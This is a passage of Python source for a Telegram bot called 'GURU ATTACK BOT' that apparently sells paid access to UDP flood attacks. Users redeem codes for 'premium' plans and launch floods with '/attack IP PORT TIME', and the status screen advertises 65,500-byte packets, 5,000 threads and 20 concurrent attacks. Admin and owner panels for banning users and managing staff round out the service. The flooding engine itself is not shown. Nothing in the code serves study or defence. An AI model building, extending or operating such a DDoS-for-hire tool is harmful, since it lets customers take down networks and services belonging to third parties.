            keyboard.append([InlineKeyboardButton(f"❌ {admin['user_id']}", callback_data=f"demote_{admin['user_id']}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    if not keyboard:
        await query.edit_message_text("No admins to demote!")
        return
    
    await query.edit_message_text(
        "👑 *DEMOTE ADMIN*\n\nSelect admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin `{user_id}` demoted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote admin!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`\n\nSend /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
            await update.message.reply_text("❌ Cannot ban owner or pseudo owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, f"Banned by {update.effective_user.id}", update.effective_user.id)
        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    text = "👑 *ADMIN LIST*\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        text += f"• `{admin['user_id']}` - {level}\n"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

# ===== REDEEM COMMAND =====
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\n"
            "Send: `/redeem CODE`\n"
            "Example: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You have already used a redeem code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {result['access_days']} days\n"
            f"📊 Plan: PREMIUM\n"
            f"⚡ 20x UDP: ENABLED\n\n"
            f"🎉 You now have premium access!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\n"
            "The code is invalid or already used.",
            parse_mode='Markdown'
        )

# ===== STATUS COMMAND =====
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🎯 Method: API-ONLY UDP\n"
        f"📦 Packet: 65,500 bytes\n"
        f"💪 Threads: 5,000\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown'
    )

# ===== BACK =====
async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if db.is_owner_or_pseudo(user_id):
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    if not is_admin:
        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
    
    await query.edit_message_text(
        f"👋 *WELCOME BACK*",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
application = None

def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("kill", kill_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks - Main
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Admin
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(process_delete_callback, pattern="^del_"))
    
    # Owner
    app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    app.add_handler(CallbackQueryHandler(owner_kill_switch_callback, pattern="^owner_kill$"))
    app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_promote))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started with all features!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("👑 GURU ATTACK BOT")
    print("⚡ 20x UDP CONCURRENT")
    print("💎 PREMIUM ONLY")
    print("📌 API-ONLY UDP - NO FALLBACK")
    print("📌 Admin + Owner Panel")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)